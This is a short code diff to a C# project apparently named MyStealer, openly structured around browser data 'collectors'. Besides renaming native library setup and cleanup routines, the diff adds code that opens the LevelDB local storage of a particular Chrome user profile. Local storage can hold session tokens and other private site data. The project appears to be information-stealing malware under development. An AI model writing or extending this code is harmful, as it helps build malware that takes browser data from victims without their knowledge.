@@ -1,5 +1,6 @@
 ﻿using MyStealer.Collectors;
 using MyStealer.Collectors.Browser;
+using MyStealer.Collectors.Browser.ChromiumBased;
 using Serilog;
 using System;
 using System.Collections.Generic;
@@ -23,7 +24,7 @@ namespace MyStealer
                 {
                     /* Prepare */
 
-                    NativeMethods.WriteSqliteInterop();
+                    NativeMethods.WriteLibraries();
                     if (File.Exists(Config.LogFilePath))
                         File.Delete(Config.LogFilePath); // Delete previous file to prevent appending encryption header
 
@@ -52,9 +53,12 @@ namespace MyStealer
                         }
                     }
 
+                    // chrome local storage leveldb
+                    var ldb = new LevelDB.DB(new LevelDB.Options { Comparator = new LevelDB.Comparator() }, Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome", "User Data", "Profile 6", "Local Storage", "leveldb"));
+
                     /* Cleanup */
 
-                    NativeMethods.CleanupSqliteInterop();
+                    NativeMethods.CleanupLibraries();
                 }
                 catch (Exception ex)
                 {
